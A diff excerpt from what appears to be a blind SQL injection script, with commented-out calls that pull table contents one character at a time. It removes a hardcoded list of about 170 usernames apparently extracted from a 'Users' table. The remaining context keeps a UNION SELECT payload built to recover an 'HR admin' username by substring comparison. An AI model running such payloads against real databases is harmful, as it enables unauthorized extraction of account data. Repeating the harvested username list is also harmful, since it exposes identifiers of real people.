@@ -141,13 +141,6 @@ def main():
     # )
     # roles = ['user', 'HR admin']
 
-    # usernames = crack_all(
-    #     "username",
-    #     "Users",
-    #     charset
-    # )
-    # usernames = ['xiandew', 'adevereaux', 'aharding2', 'ajean', 'akark', 'amunusamypit', 'anandasena', 'aoonei', 'atroup', 'austinl', 'baigongl', 'beli', 'bhui', 'biey', 'camwong', 'chaudharis', 'chenghongz', 'chengrh', 'chfc', 'chienchihw', 'chienlinc', 'chuanyuanl', 'cphang', 'cssun1', 'cuiyc1', 'davidt', 'dingliz', 'dkalathil', 'dongm1', 'dphan2', 'duanrd', 'eryaw', 'fmme', 'gucg', 'gyya', 'hansenl1', 'haochen4', 'haomchen', 'hcornett', 'hew4', 'hlly1', 'hongchenl', 'hsingjungc', 'huimhuang', 'jaharon', 'jcch4', 'jialezhang1', 'jialingg', 'jiaweir1', 'jiaww', 'jiaxuan', 'jinxiong', 'jiwang5', 'jkrishnan', 'johnkahyongl', 'jsarsonlawre', 'jteh3', 'juhuang1', 'junfanp', 'junkaix', 'jwhitham', 'kaixuang', 'katsuhidei', 'ksayed', 'ksoorya', 'kthu', 'leic5', 'leiluo', 'lihuwang', 'limg2', 'liyang1', 'li43', 'longzes', 'madisynf', 'mevenden', 'minghen', 'mingqhuang', 'mingqian1', 'mkollathodi', 'mmuhammadjul', 'nirmalathasa', 'orudnev', 'pawanm', 'prodigysml', 'pssoni', 'rofan', 'rrey', 'ruifengl3', 'ruofzhang', 'rwwan2', 'sajeeb', 'salyahya', 'sccheng2', 'shaowang', 'shengyanl1', 'shent1', 'shifanl', 'shijia2', 'shiruic', 'shiyangc1', 'shuaibinw', 'sinhengw', 'skumarrao', 'slohani', 'smarkani', 'smonazam', 'songlinc', 'srivastavat', 'stumewa', 'susarlan', 'tage', 'tanglt', 'tianzhi1', 'tmamjad', 'tsaie', 'tyy2', 'user2', 'user3', 'wang28', 'weilun', 'wengong', 'wentaoy1', 'wxxu1', 'xiaolzhang2', 'xiefx', 'xinminy', 'xlin5', 'xssh1', 'xzzheng1', 'yaky1', 'yangzhex', 'yanhaow', 'yannzhang', 'yaozy', 'yaweis', 'ydavur', 'yezy2', 'yibow5', 'yicunt', 'yijunj', 'yinj5', 'yiwai', 'yiwang7', 'yizih', 'yttsai', 'yuanhungl', 'yueruc', 'yuetongl', 'yuhaow1', 'yujguan', 'yuming1', 'yushuq', 'yuting6', 'yuyawang', 'ywang20', 'yzzheng', 'zccu', 'zhankuil', 'zhenpengl', 'zhishuil', 'zhiyaol', 'zilongd', 'zixinzhang1', 'ziyliu2', 'ztang']
-
     # 8. find admin username
     # admin = crack(
     #     "union select NULL,roles,username from Users having length(username)>={index} and substr(username,1,{index})=BINARY '{answer}' and roles=BINARY 'HR admin' limit 1 --+",
